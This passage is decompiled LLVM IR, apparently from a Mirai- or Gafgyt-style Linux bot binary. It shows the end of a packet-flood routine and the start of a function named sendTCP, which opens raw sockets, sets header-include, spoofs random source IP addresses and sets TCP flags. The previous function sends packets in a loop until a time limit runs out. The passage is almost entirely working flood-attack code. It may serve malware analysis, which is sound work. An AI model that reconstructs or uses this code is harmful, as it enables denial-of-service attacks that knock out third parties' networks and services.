  %v3_804ba2d = call i32 @htons(i16 %v2_804ba2d)
  %v1_804ba32 = urem i32 %v3_804ba2d, 65536
  store i32 %v1_804ba32, i32* %edx.global-to-local, align 4
  store i32 %v1_804b9db, i32* %eax.global-to-local, align 4
  %v1_804ba38 = trunc i32 %v3_804ba2d to i16
  %v3_804ba38 = add i32 %v2_804b9c3, 24
  %v4_804ba38 = inttoptr i32 %v3_804ba38 to i16*
  store i16 %v1_804ba38, i16* %v4_804ba38, align 8
  %v2_804ba3c = call i32 @rand_cmwc(i32 %v1_804b9db)
  %v1_804ba41 = urem i32 %v2_804ba3c, 65536
  store i32 %v1_804ba41, i32* %edx.global-to-local, align 4
  store i32 %v1_804b9db, i32* %eax.global-to-local, align 4
  %v1_804ba47 = trunc i32 %v2_804ba3c to i16
  store i16 %v1_804ba47, i16* %v5_804b9de, align 4
  br i1 %v1_804b77f, label %dec_label_pc_804ba5d, label %dec_label_pc_804ba50

dec_label_pc_804ba50:                             ; preds = %dec_label_pc_804b99c
  %v2_804ba50 = call i32 @rand_cmwc(i32 %v1_804b9db)
  %.pre = urem i32 %arg2, 65536
  br label %dec_label_pc_804ba71

dec_label_pc_804ba5d:                             ; preds = %dec_label_pc_804b99c
  %v1_804ba60 = urem i32 %arg2, 65536
  store i32 %v1_804ba60, i32* %eax.global-to-local, align 4
  %v1_804ba63 = load i32, i32* @esp, align 4
  %v2_804ba63 = inttoptr i32 %v1_804ba63 to i32*
  store i32 %v1_804ba60, i32* %v2_804ba63, align 4
  %v3_804ba66 = call i32 @htons(i16 %tmp23)
  br label %dec_label_pc_804ba71

dec_label_pc_804ba71:                             ; preds = %dec_label_pc_804ba50, %dec_label_pc_804ba5d
  %v1_804bb2a.pre-phi = phi i32 [ %.pre, %dec_label_pc_804ba50 ], [ %v1_804ba60, %dec_label_pc_804ba5d ]
  %storemerge8.in = phi i32 [ %v2_804ba50, %dec_label_pc_804ba50 ], [ %v3_804ba66, %dec_label_pc_804ba5d ]
  %storemerge5 = trunc i32 %storemerge8.in to i16
  %sext = mul i32 %storemerge8.in, 65536
  %v4_804ba74 = sdiv i32 %sext, 65536
  %v3_804ba77 = add i32 %v2_804b9c3, 22
  %v4_804ba77 = inttoptr i32 %v3_804ba77 to i16*
  store i16 %storemerge5, i16* %v4_804ba77, align 2
  %v1_804ba7e = add i32 %v2_804b9c3, 26
  %v2_804ba7e = inttoptr i32 %v1_804ba7e to i16*
  store i16 0, i16* %v2_804ba7e, align 2
  %v1_804ba87 = add i32 %v2_804b9c3, 28
  store i32 %v1_804ba87, i32* %edx.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v1_804ba8d = load i32, i32* @esp, align 4
  %v2_804ba8d = add i32 %v1_804ba8d, 4
  %v3_804ba8d = inttoptr i32 %v2_804ba8d to i32*
  store i32 %arg5, i32* %v3_804ba8d, align 4
  %v0_804ba91 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ba91 = load i32, i32* @esp, align 4
  %v2_804ba91 = inttoptr i32 %v1_804ba91 to i32*
  store i32 %v0_804ba91, i32* %v2_804ba91, align 4
  %v3_804ba94 = sext i16 %tmp to i32
  %v4_804ba94 = inttoptr i32 %v4_804ba74 to i8*
  %v5_804ba94 = call i32 @makeRandomStr(i8* %v4_804ba94, i32 %v3_804ba94)
  store i32 %v2_804b9c3, i32* %eax.global-to-local, align 4
  %v1_804ba9c = or i32 %v2_804b9c3, 2
  %v2_804ba9c = inttoptr i32 %v1_804ba9c to i16*
  %v3_804ba9c = load i16, i16* %v2_804ba9c, align 2
  %v4_804ba9c = zext i16 %v3_804ba9c to i32
  store i32 %v4_804ba9c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b9c3, i32* %eax.global-to-local, align 4
  %v1_804baa5 = load i32, i32* @esp, align 4
  %v2_804baa5 = add i32 %v1_804baa5, 4
  %v3_804baa5 = inttoptr i32 %v2_804baa5 to i32*
  store i32 %v4_804ba9c, i32* %v3_804baa5, align 4
  %v0_804baa9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804baa9 = load i32, i32* @esp, align 4
  %v2_804baa9 = inttoptr i32 %v1_804baa9 to i32*
  store i32 %v0_804baa9, i32* %v2_804baa9, align 4
  %v4_804baac = inttoptr i32 %v4_804ba74 to i16*
  %v5_804baac = call i32 @csum(i16* %v4_804baac, i32 %v3_804ba94)
  %v1_804bab1 = urem i32 %v5_804baac, 65536
  store i32 %v1_804bab1, i32* %edx.global-to-local, align 4
  store i32 %v2_804b9c3, i32* %eax.global-to-local, align 4
  %v1_804bab7 = trunc i32 %v5_804baac to i16
  %v3_804bab7 = or i32 %v2_804b9c3, 10
  %v4_804bab7 = inttoptr i32 %v3_804bab7 to i16*
  store i16 %v1_804bab7, i16* %v4_804bab7, align 2
  %v0_804babb = load i32, i32* @esp, align 4
  %v1_804babb = inttoptr i32 %v0_804babb to i32*
  store i32 0, i32* %v1_804babb, align 4
  %v2_804bac2 = inttoptr i32 %v4_804ba74 to i32*
  %v3_804bac2 = call i32 @__GI_time(i32* %v2_804bac2)
  %v5_804bac7 = add i32 %v3_804bac2, %arg3
  store i32 %v5_804bac7, i32* %eax.global-to-local, align 4
  %v3_804bb50 = or i32 %v2_804b9c3, 4
  %v4_804bb50 = inttoptr i32 %v3_804bb50 to i16*
  %v2_804bb6c = or i32 %v2_804b9c3, 12
  %v3_804bb6c = inttoptr i32 %v2_804bb6c to i32*
  br label %dec_label_pc_804bad6

dec_label_pc_804bad6:                             ; preds = %dec_label_pc_804bb99, %dec_label_pc_804bbb6, %dec_label_pc_804ba71
  %stack_var_-80.0 = phi i32 [ 0, %dec_label_pc_804ba71 ], [ %v4_804bbb6, %dec_label_pc_804bbb6 ], [ 0, %dec_label_pc_804bb99 ]
  %stack_var_-96.0 = phi i16 [ %tmp, %dec_label_pc_804ba71 ], [ %storemerge, %dec_label_pc_804bbb6 ], [ %storemerge, %dec_label_pc_804bb99 ]
  store i32 %v2_804b9c3, i32* %edx.global-to-local, align 4
  %v0_804badc = load i32, i32* @esp, align 4
  %v1_804badc = add i32 %v0_804badc, 20
  %v2_804badc = inttoptr i32 %v1_804badc to i32*
  store i32 16, i32* %v2_804badc, align 4
  %v1_804bae4 = load i32, i32* @esp, align 4
  %v2_804bae4 = add i32 %v1_804bae4, 16
  %v3_804bae4 = inttoptr i32 %v2_804bae4 to i32*
  store i32 %v2_804b7a4, i32* %v3_804bae4, align 4
  %v0_804bae8 = load i32, i32* @esp, align 4
  %v1_804bae8 = add i32 %v0_804bae8, 12
  %v2_804bae8 = inttoptr i32 %v1_804bae8 to i32*
  store i32 0, i32* %v2_804bae8, align 4
  %v1_804baf3 = load i32, i32* @esp, align 4
  %v2_804baf3 = add i32 %v1_804baf3, 8
  %v3_804baf3 = inttoptr i32 %v2_804baf3 to i32*
  store i32 %v1_804b99f, i32* %v3_804baf3, align 4
  %v0_804baf7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804baf7 = load i32, i32* @esp, align 4
  %v2_804baf7 = add i32 %v1_804baf7, 4
  %v3_804baf7 = inttoptr i32 %v2_804baf7 to i32*
  store i32 %v0_804baf7, i32* %v3_804baf7, align 4
  store i32 %v3_804b8ee, i32* %eax.global-to-local, align 4
  %v1_804bafe = load i32, i32* @esp, align 4
  %v2_804bafe = inttoptr i32 %v1_804bafe to i32*
  store i32 %v3_804b8ee, i32* %v2_804bafe, align 4
  %v6_804bb01 = call i32 @__libc_sendto(i32 %stack_var_-80.0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804bb01, i32* %eax.global-to-local, align 4
  %v1_804bb06 = call i32 @rand_cmwc(i32 %stack_var_-80.0)
  %v1_804bb0b = urem i32 %v1_804bb06, 65536
  store i32 %v1_804bb0b, i32* %edx.global-to-local, align 4
  store i32 %v1_804b9db, i32* %eax.global-to-local, align 4
  %v1_804bb11 = trunc i32 %v1_804bb06 to i16
  store i16 %v1_804bb11, i16* %v5_804b9de, align 4
  br i1 %v1_804b77f, label %dec_label_pc_804bb27, label %dec_label_pc_804bb1a

dec_label_pc_804bb1a:                             ; preds = %dec_label_pc_804bad6
  %v1_804bb1a = call i32 @rand_cmwc(i32 %stack_var_-80.0)
  br label %dec_label_pc_804bb3b

dec_label_pc_804bb27:                             ; preds = %dec_label_pc_804bad6
  store i32 %v1_804bb2a.pre-phi, i32* %eax.global-to-local, align 4
  %v1_804bb2d = load i32, i32* @esp, align 4
  %v2_804bb2d = inttoptr i32 %v1_804bb2d to i32*
  store i32 %v1_804bb2a.pre-phi, i32* %v2_804bb2d, align 4
  %v3_804bb30 = call i32 @htons(i16 %stack_var_-96.0)
  br label %dec_label_pc_804bb3b

dec_label_pc_804bb3b:                             ; preds = %dec_label_pc_804bb1a, %dec_label_pc_804bb27
  %storemerge9.in = phi i32 [ %v1_804bb1a, %dec_label_pc_804bb1a ], [ %v3_804bb30, %dec_label_pc_804bb27 ]
  %storemerge = trunc i32 %storemerge9.in to i16
  store i32 %v1_804b9db, i32* %eax.global-to-local, align 4
  %sext10 = mul i32 %storemerge9.in, 65536
  %v4_804bb3e = sdiv i32 %sext10, 65536
  store i32 %v4_804bb3e, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804ba77, align 2
  %v2_804bb45 = call i32 @rand_cmwc(i32 %v4_804bb3e)
  %v1_804bb4a = urem i32 %v2_804bb45, 65536
  store i32 %v1_804bb4a, i32* %edx.global-to-local, align 4
  %v1_804bb50 = trunc i32 %v2_804bb45 to i16
  store i16 %v1_804bb50, i16* %v4_804bb50, align 4
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v1_804bb57 = load i32, i32* @esp, align 4
  %v2_804bb57 = inttoptr i32 %v1_804bb57 to i32*
  store i32 %storemerge6, i32* %v2_804bb57, align 4
  %v3_804bb5a = call i32 @getRandomIP(i32 %v4_804bb3e, i32 %v13_804b772)
  store i32 %v3_804bb5a, i32* %eax.global-to-local, align 4
  %v1_804bb5f = load i32, i32* @esp, align 4
  %v2_804bb5f = inttoptr i32 %v1_804bb5f to i32*
  store i32 %v3_804bb5a, i32* %v2_804bb5f, align 4
  %v0_804bb62 = call i32 @htonl()
  store i32 %v0_804bb62, i32* %edx.global-to-local, align 4
  store i32 %v0_804bb62, i32* %v3_804bb6c, align 4
  store i32 %v2_804b9c3, i32* %eax.global-to-local, align 4
  %v3_804bb72 = load i16, i16* %v2_804ba9c, align 2
  %v4_804bb72 = zext i16 %v3_804bb72 to i32
  store i32 %v4_804bb72, i32* %edx.global-to-local, align 4
  store i32 %v2_804b9c3, i32* %eax.global-to-local, align 4
  %v1_804bb7b = load i32, i32* @esp, align 4
  %v2_804bb7b = add i32 %v1_804bb7b, 4
  %v3_804bb7b = inttoptr i32 %v2_804bb7b to i32*
  store i32 %v4_804bb72, i32* %v3_804bb7b, align 4
  %v0_804bb7f = load i32, i32* %eax.global-to-local, align 4
  %v1_804bb7f = load i32, i32* @esp, align 4
  %v2_804bb7f = inttoptr i32 %v1_804bb7f to i32*
  store i32 %v0_804bb7f, i32* %v2_804bb7f, align 4
  %v3_804bb82 = inttoptr i32 %v4_804bb3e to i16*
  %v4_804bb82 = call i32 @csum(i16* %v3_804bb82, i32 %v13_804b772)
  %v1_804bb87 = urem i32 %v4_804bb82, 65536
  store i32 %v1_804bb87, i32* %edx.global-to-local, align 4
  %v1_804bb8d = trunc i32 %v4_804bb82 to i16
  store i16 %v1_804bb8d, i16* %v4_804bab7, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804bb94 = icmp eq i32 %stack_var_-80.0, %arg6
  %v1_804bb97 = icmp eq i1 %v15_804bb94, false
  br i1 %v1_804bb97, label %dec_label_pc_804bbb6, label %dec_label_pc_804bb99

dec_label_pc_804bb99:                             ; preds = %dec_label_pc_804bb3b
  %v0_804bb99 = load i32, i32* @esp, align 4
  %v1_804bb99 = inttoptr i32 %v0_804bb99 to i32*
  store i32 0, i32* %v1_804bb99, align 4
  %v2_804bba0 = inttoptr i32 %v4_804bb3e to i32*
  %v3_804bba0 = call i32 @__GI_time(i32* %v2_804bba0)
  store i32 %v3_804bba0, i32* %eax.global-to-local, align 4
  %v8_804bba8 = icmp sgt i32 %v3_804bba0, %v5_804bac7
  br i1 %v8_804bba8, label %dec_label_pc_804bbbe, label %dec_label_pc_804bad6

dec_label_pc_804bbb6:                             ; preds = %dec_label_pc_804bb3b
  %v4_804bbb6 = add i32 %stack_var_-80.0, 1
  br label %dec_label_pc_804bad6

dec_label_pc_804bbbe:                             ; preds = %dec_label_pc_804bb99, %dec_label_pc_804b901, %dec_label_pc_804b8d2
  %v0_804bbc720 = phi i32 [ %v5_804b92d, %dec_label_pc_804b901 ], [ %v3_804b8ee, %dec_label_pc_804b8d2 ], [ %v3_804bba0, %dec_label_pc_804bb99 ]
  br label %dec_label_pc_804bbc1

dec_label_pc_804bbc1:                             ; preds = %dec_label_pc_804b8af, %dec_label_pc_804b80d, %dec_label_pc_804b7e4, %dec_label_pc_804b7a4, %dec_label_pc_804bbbe
  %v0_804bbc7 = phi i32 [ 0, %dec_label_pc_804b80d ], [ 0, %dec_label_pc_804b7e4 ], [ %v3_804b7b4, %dec_label_pc_804b7a4 ], [ %v0_804bbc720, %dec_label_pc_804bbbe ], [ %v2_804b8b6, %dec_label_pc_804b8af ]
  store i32 %v0_804b771, i32* @ebx, align 4
  store i32 %v0_804b770, i32* @edi, align 4
  ret i32 %v0_804bbc7

; uselistorder directives
  uselistorder i32 %v4_804bb82, { 1, 0 }
  uselistorder i32 %v2_804bb45, { 1, 0 }
  uselistorder i32 %v4_804bb3e, { 4, 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v1_804bb06, { 1, 0 }
  uselistorder i32 %stack_var_-80.0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v5_804baac, { 1, 0 }
  uselistorder i32 %v4_804ba74, { 2, 1, 0 }
  uselistorder i32 %v1_804bb2a.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804ba60, { 2, 1, 0 }
  uselistorder i32 %v2_804ba3c, { 1, 0 }
  uselistorder i32 %v3_804ba2d, { 1, 0 }
  uselistorder i32 %v1_804ba27, { 1, 0 }
  uselistorder i32 %v2_804b9c3, { 10, 9, 8, 18, 17, 16, 7, 6, 15, 5, 14, 13, 12, 11, 3, 4, 2, 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804b995, { 1, 0 }
  uselistorder i32 %v3_804b8ee, { 0, 2, 1, 5, 4, 3, 6, 7 }
  uselistorder i32 %stack_var_-84.0, { 1, 0 }
  uselistorder i32 %v1_804b814, { 1, 3, 2, 0, 5, 4, 6, 7 }
  uselistorder i32 %v1_804b810, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_804b7fb, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_804b7a4, { 1, 0 }
  uselistorder i32 %v1_804b792, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 2, 3, 1, 4, 5, 6, 7, 0, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 8, 0, 1, 2, 3, 7, 4, 5, 6, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 30, 29, 32, 31, 34, 33, 37, 35, 36, 40, 38, 39, 42, 41, 43, 44, 46, 45, 47 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bbc1, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804bb3b, { 1, 0 }
  uselistorder label %dec_label_pc_804bad6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ba71, { 1, 0 }
  uselistorder label %dec_label_pc_804b99c, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_804b944, { 1, 0 }
  uselistorder label %dec_label_pc_804b8af, { 1, 0 }
  uselistorder label %dec_label_pc_804b865, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b7a4, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp40 = call i16 @__decompiler_undefined_function_4()
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %tmp42 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804bbcb = load i32, i32* @edi, align 4
  %v0_804bbcc = load i32, i32* @esi, align 4
  %v0_804bbcd = load i32, i32* @ebx, align 4
  %v15_804bbce = ptrtoint i32* %stack_var_-188 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bbe5 = icmp eq i32 %arg2, 0
  %v1_804bbe9 = icmp eq i1 %v4_804bbe5, false
  br i1 %v1_804bbe9, label %dec_label_pc_804bbf9, label %dec_label_pc_804bbeb

dec_label_pc_804bbeb:                             ; preds = %entry
  %v1_804bbeb = call i32 @rand_cmwc(i32 %v15_804bbce)
  br label %dec_label_pc_804bc0e

dec_label_pc_804bbf9:                             ; preds = %entry
  %v1_804bbfc = urem i32 %arg2, 65536
  store i32 %v1_804bbfc, i32* %eax.global-to-local, align 4
  store i32 %v1_804bbfc, i32* %stack_var_-188, align 4
  %v1_804bc02 = trunc i32 %arg2 to i16
  %v2_804bc02 = call i32 @htons(i16 %v1_804bc02)
  br label %dec_label_pc_804bc0e

dec_label_pc_804bc0e:                             ; preds = %dec_label_pc_804bbeb, %dec_label_pc_804bbf9
  %v2_804bc0e = ptrtoint i32* %stack_var_-60 to i32
  %v5_804bc11 = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804bc11, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-188, align 4
  %v3_804bc1e = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v3_804bc1e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bc23 = icmp eq i32 %v3_804bc1e, 0
  br i1 %v1_804bc23, label %dec_label_pc_804bc2c, label %dec_label_pc_804c15b

dec_label_pc_804bc2c:                             ; preds = %dec_label_pc_804bc0e
  %v5_804bc2f = icmp ugt i32* %stack_var_-60, inttoptr (i32 -9 to i32*)
  store i1 %v5_804bc2f, i1* %cf.global-to-local, align 1
  %v15_804bc2f = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804bc2f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 2, i32* %stack_var_-188, align 4
  %v3_804bc56 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_804bc56, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bc5e = icmp eq i32 %v3_804bc56, 0
  %v1_804bc62 = icmp eq i1 %v4_804bc5e, false
  br i1 %v1_804bc62, label %dec_label_pc_804bc69, label %dec_label_pc_804c15b

dec_label_pc_804bc69:                             ; preds = %dec_label_pc_804bc2c
  store i32 1, i32* %stack_var_-64, align 4
  %v2_804bc78 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v3_804bc56, i32* %eax.global-to-local, align 4
  store i32 %v3_804bc56, i32* %stack_var_-188, align 4
  %v5_804bc95 = call i32 @__GI_setsockopt(i32 %v3_804bc56, i32 0, i32 3, i32 %v2_804bc78, i32 4)
  store i32 %v5_804bc95, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804bc9a = icmp slt i32 %v5_804bc95, 0
  %v1_804bc9c = icmp eq i1 %v2_804bc9a, false
  br i1 %v1_804bc9c, label %dec_label_pc_804bca3, label %dec_label_pc_804c15b

dec_label_pc_804bca3:                             ; preds = %dec_label_pc_804bc69
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bca3 = icmp eq i32 %arg4, 0
  %v1_804bca7 = icmp eq i1 %v4_804bca3, false
  br i1 %v1_804bca7, label %dec_label_pc_804bcb2, label %dec_label_pc_804bcc8

dec_label_pc_804bcb2:                             ; preds = %dec_label_pc_804bca3
  %v5_804bcb9 = sub i32 32, %arg4
  %v10_804bcb9 = icmp ugt i32 %arg4, 32
  store i1 %v10_804bcb9, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804bcc1 = urem i32 %v5_804bcb9, 32
  %v4_804bcc1 = icmp eq i32 %v2_804bcc1, 0
  br i1 %v4_804bcc1, label %bb91, label %bb

bb:                                               ; preds = %dec_label_pc_804bcb2
  %v5_804bcc1 = shl i32 1, %v2_804bcc1
  store i32 %v5_804bcc1, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb91

bb91:                                             ; preds = %dec_label_pc_804bcb2, %bb
  %v0_804bcc3 = phi i32 [ 1, %dec_label_pc_804bcb2 ], [ %v5_804bcc1, %bb ]
  %v1_804bcc3 = sub i32 0, %v0_804bcc3
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804bcc3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bcc8

dec_label_pc_804bcc8:                             ; preds = %dec_label_pc_804bca3, %bb91
  %storemerge11 = phi i32 [ %v1_804bcc3, %bb91 ], [ 0, %dec_label_pc_804bca3 ]
  %v1_804bccb = add i32 %arg6, 40
  %v1_804bcd7 = add i32 %arg6, 70
  %v2_804bcda = and i32 %v1_804bcd7, -16
  %v0_804bce0 = load i32, i32* @esp, align 4
  %v2_804bce0 = sub i32 %v0_804bce0, %v2_804bcda
  %v1_804bce2 = add i32 %v2_804bce0, 24
  store i32 %v1_804bce2, i32* %edx.global-to-local, align 4
  %v1_804bcec = add i32 %v2_804bce0, 39
  %v2_804bcef = and i32 %v1_804bcec, -16
  %v1_804bd07 = add i32 %v2_804bcef, 20
  %v5_804bd0a = inttoptr i32 %v1_804bd07 to i16*
  %v1_804bd10 = add i32 %arg6, 20
  %v5_804bd10 = icmp ugt i32 %arg6, -21
  store i1 %v5_804bd10, i1* %cf.global-to-local, align 1
  store i32 %v1_804bd10, i32* @ebx, align 4
  store i32 %storemerge11, i32* %eax.global-to-local, align 4
  %v2_804bd18 = inttoptr i32 %v2_804bce0 to i32*
  store i32 %storemerge11, i32* %v2_804bd18, align 4
  %v2_804bd1b = call i32 @getRandomIP(i32 %v1_804bccb, i32 %v2_804bcef)
  store i32 %v2_804bd1b, i32* %eax.global-to-local, align 4
  %v1_804bd20 = load i32, i32* @esp, align 4
  %v2_804bd20 = inttoptr i32 %v1_804bd20 to i32*
  store i32 %v2_804bd1b, i32* %v2_804bd20, align 4
  %v0_804bd23 = call i32 @htonl()
  %v3_804bd28 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804bd28, i32* %edx.global-to-local, align 4
  %v0_804bd2b = load i32, i32* @ebx, align 4
  %v1_804bd2b = load i32, i32* @esp, align 4
  %v2_804bd2b = add i32 %v1_804bd2b, 16
  %v3_804bd2b = inttoptr i32 %v2_804bd2b to i32*
  store i32 %v0_804bd2b, i32* %v3_804bd2b, align 4
  %v0_804bd2f = load i32, i32* @esp, align 4
  %v1_804bd2f = add i32 %v0_804bd2f, 12
  %v2_804bd2f = inttoptr i32 %v1_804bd2f to i32*
  store i32 6, i32* %v2_804bd2f, align 4
  %v1_804bd37 = load i32, i32* @esp, align 4
  %v2_804bd37 = add i32 %v1_804bd37, 8
  %v3_804bd37 = inttoptr i32 %v2_804bd37 to i32*
  store i32 %v0_804bd23, i32* %v3_804bd37, align 4
  %v0_804bd3b = load i32, i32* %edx.global-to-local, align 4
  %v1_804bd3b = load i32, i32* @esp, align 4
  %v2_804bd3b = add i32 %v1_804bd3b, 4
  %v3_804bd3b = inttoptr i32 %v2_804bd3b to i32*
  store i32 %v0_804bd3b, i32* %v3_804bd3b, align 4
  store i32 %v2_804bcef, i32* %eax.global-to-local, align 4
  %v1_804bd42 = load i32, i32* @esp, align 4
  %v2_804bd42 = inttoptr i32 %v1_804bd42 to i32*
  store i32 %v2_804bcef, i32* %v2_804bd42, align 4
  %v0_804bd45 = call i32 @makeIPPacket()
  store i32 %v0_804bd45, i32* %eax.global-to-local, align 4
  %v2_804bd4a = call i32 @rand_cmwc(i32 %v1_804bd07)
  %v1_804bd4f = urem i32 %v2_804bd4a, 65536
  store i32 %v1_804bd4f, i32* %edx.global-to-local, align 4
  store i32 %v1_804bd07, i32* %eax.global-to-local, align 4
  %v1_804bd55 = trunc i32 %v2_804bd4a to i16
  store i16 %v1_804bd55, i16* %v5_804bd0a, align 4
  %v2_804bd58 = call i32 @rand_cmwc(i32 %v1_804bd07)
  %v2_804bd62 = add i32 %v2_804bcef, 24
  %v3_804bd62 = inttoptr i32 %v2_804bd62 to i32*
  store i32 %v2_804bd58, i32* %v3_804bd62, align 8
  store i32 %v1_804bd07, i32* %eax.global-to-local, align 4
  %v1_804bd68 = add i32 %v2_804bcef, 28
  %v2_804bd68 = inttoptr i32 %v1_804bd68 to i32*
  store i32 0, i32* %v2_804bd68, align 4
  store i32 %v1_804bd07, i32* %edx.global-to-local, align 4
  %v1_804bd72 = add i32 %v2_804bcef, 32
  %v2_804bd72 = inttoptr i32 %v1_804bd72 to i8*
  %v3_804bd72 = load i8, i8* %v2_804bd72, align 16
  %v2_804bd76 = urem i8 %v3_804bd72, 16
  %v2_804bd78 = or i8 %v2_804bd76, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v2_804bd78, i8* %v2_804bd72, align 16
  %v4_804bd7d = ptrtoint i8* %arg5 to i32
  store i32 %v4_804bd7d, i32* %eax.global-to-local, align 4
  store i32 %v4_804bd7d, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8052eb0.46 to i32), i32* @edi, align 4
  %v7_804bd9b = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052eb0.46, i32 0, i32 0), i32 4)
  %v8_804bd9b = urem i32 %v7_804bd9b, 2
  %v9_804bd9b = icmp eq i32 %v8_804bd9b, 0
  %v0_804bd9d = load i1, i1* %cf.global-to-local, align 1
  %v2_804bd9d = or i1 %v0_804bd9d, %v9_804bd9b
  %v3_804bd9d = zext i1 %v2_804bd9d to i32
  %v4_804bd9d = load i32, i32* %edx.global-to-local, align 4
  %v5_804bd9d = and i32 %v4_804bd9d, -256
  %v6_804bd9d = or i32 %v3_804bd9d, %v5_804bd9d
  %v7_804bd9d = xor i32 %v6_804bd9d, 1
  store i32 %v7_804bd9d, i32* @edx, align 4
  %v3_804bda3 = and i32 %v7_804bd9b, -256
  %v1_804bda5 = trunc i32 %v7_804bd9d to i8
  %v3_804bda5 = zext i1 %v0_804bd9d to i8
  %v4_804bda5 = sub nsw i8 %v1_804bda5, %v3_804bda5
  %v15_804bda5 = icmp eq i8 %v4_804bda5, 0
  %v20_804bda5 = zext i8 %v4_804bda5 to i32
  %v23_804bda5 = or i32 %v20_804bda5, %v3_804bda3
  store i32 %v23_804bda5, i32* @ecx, align 4
  %v2_804bda9 = sext i8 %v4_804bda5 to i32
  store i32 %v2_804bda9, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bdae = icmp eq i1 %v15_804bda5, false
  br i1 %v1_804bdae, label %dec_label_pc_804bdf1, label %dec_label_pc_804bdb0

dec_label_pc_804bdb0:                             ; preds = %dec_label_pc_804bcc8
  store i32 %v1_804bd07, i32* %edx.global-to-local, align 4
  %v1_804bdb3 = add i32 %v2_804bcef, 33
  %v2_804bdb3 = inttoptr i32 %v1_804bdb3 to i8*
  %v3_804bdb3 = load i8, i8* %v2_804bdb3, align 1
  %v2_804bdb7 = or i8 %v3_804bdb3, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bdb7 = zext i8 %v2_804bdb7 to i32
  store i32 %v7_804bdb7, i32* %eax.global-to-local, align 4
  store i8 %v2_804bdb7, i8* %v2_804bdb3, align 1
  store i32 %v1_804bd07, i32* %edx.global-to-local, align 4
  %v3_804bdbf = load i8, i8* %v2_804bdb3, align 1
  %v2_804bdc3 = or i8 %v3_804bdbf, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bdc3 = zext i8 %v2_804bdc3 to i32
  store i32 %v7_804bdc3, i32* %eax.global-to-local, align 4
  store i8 %v2_804bdc3, i8* %v2_804bdb3, align 1
  store i32 %v1_804bd07, i32* %edx.global-to-local, align 4
  %v3_804bdcb = load i8, i8* %v2_804bdb3, align 1
